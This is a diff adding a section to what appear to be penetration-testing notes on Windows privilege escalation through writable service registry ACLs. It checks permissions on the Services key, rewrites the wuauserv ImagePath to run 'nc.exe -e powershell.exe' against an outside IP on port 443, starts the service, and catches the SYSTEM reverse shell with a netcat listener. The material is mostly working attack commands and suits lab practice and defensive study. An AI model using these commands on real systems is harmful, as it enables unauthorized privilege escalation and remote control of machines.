@@ -1387,3 +1387,32 @@ nt authority\system
 ```
 
 </details>
+
+<details>
+
+<summary>Abuse Service Registry ACLs</summary>
+
+```powershell
+# Check the permissions of HKLM:\SYSTEM\CurrentControlSet\Services subkey
+$acl = Get-ACL -Path HKLM:\SYSTEM\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
+```
+
+<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption><p>User "Hector" has full control over the HKLM:\SYSTEM\CurrentControlSet\Services subkey</p></figcaption></figure>
+
+Exploit using a service that's running as NT AUTHORITY\SYSTEM that we have permissions to start --> wuauserv or seclogon
+
+<figure><img src="../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>
+
+```powershell
+Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\wuauserv -name ImagePath -value "c:\temp\nc.exe -e powershell.exe 10.10.14.13 443"
+sc.exe start wuauserv
+```
+
+```
+nc -lvp 443
+```
+
+<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
+
+</details>
